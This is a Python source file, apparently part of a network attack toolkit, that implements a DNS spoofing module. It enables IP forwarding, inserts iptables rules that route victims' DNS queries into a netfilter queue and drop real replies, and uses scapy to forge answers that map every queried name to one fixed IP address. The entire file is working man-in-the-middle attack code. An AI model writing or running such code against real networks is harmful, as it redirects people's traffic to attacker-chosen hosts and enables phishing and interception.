from CommandModule import *
from scapy.all import *
from NetEnvManager import *
from netfilterqueue import NetfilterQueue
import _thread

class DnsSpoofing(CommandModule) :
    command = "dns"
    outline = "--"
    manual = "--"
    nfqueue = {}


    def getNFQueue(self, num) :
        if None == self.nfqueue.get(num) :
            self.nfqueue[num] = NetfilterQueue()
        return self.nfqueue[num]
	

    def run(self) :
        if False == NetSetup.getInstance().checkIpForward() :
            NetSetup.getInstance().ipForward(1)


        # This rule of iptables can make a packet which is modifiable.
        queryID = 1
        table = "-t nat "
        checkOpt = "\"udp dpt:53 NFQUEUE num " + str(queryID) + "\""
        iptablesOpt = table + " -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num " + str(queryID)
        if False == NetSetup.getInstance().checkIpTables(table, checkOpt) :
            NetSetup.getInstance().ipTables(iptablesOpt)

        table = ""
        checkOpt = "\"udp spt:53\""
        iptablesOpt = table + "-A FORWARD -p udp --sport 53 -j DROP"
        if False == NetSetup.getInstance().checkIpTables(table, checkOpt) :
            NetSetup.getInstance().ipTables(iptablesOpt)

        
        # DNS-Spoofing
        _thread.start_new_thread(self.dnsCachePoisoning, ("DNS cache poisoning", queryID))
        # self.dnsCachePoisoning(queryID)


    def dnsCachePoisoning(self, title, queryID) :
        print("# DNS cache poisoning...")
        try :
            self.getNFQueue(queryID).bind(queryID, self.dnsQueryCallback)
            self.getNFQueue(queryID).run()

        except KeyboardInterrupt :
            self.getNFQueue(queryID).unbind()

            NetSetup.getInstance().ipForward(0)
            iptablesOpt = "-F"
            NetSetup.getInstance().ipTables(iptablesOpt)
            iptablesOpt = "-t nat -F"
            NetSetup.getInstance().ipTables(iptablesOpt)


    def dnsQueryCallback(self, packet) :
        print("# DNS Query")
        resq = self.makeDnsResponse(packet)
        send(resq)
        packet.drop()


    def makeDnsResponse(self, packet) :
        pkt = IP(packet.get_payload())
        # pkt.show()
        fakeIp = "125.209.222.141"	# naver.com
        ip = IP()
        ip.src = pkt[IP].dst
        ip.dst = pkt[IP].src

        udp = UDP()
        udp.sport = pkt[UDP].dport
        udp.dport = pkt[UDP].sport

        dns = DNS()
        dns.id = pkt[DNS].id	# Transaction ID.
        dns.qr      = 1			# query or response.
        dns.rd      = 0			# Recursion desired.
        dns.qdcount = 1			# Question count.
        dns.ancount = 1			# Answer count.
        dns.qd = pkt[DNS].qd
        dns.an = DNSRR(rrname=pkt[DNS].qd.qname, type=1, rclass=0x0001, ttl=25740, rdlen=4, rdata=fakeIp)

        resp = ip/udp/dns
        # resp.show()
        return resp


if __name__ == '__main__' :
    a = DnsSpoofing()
    a.run();
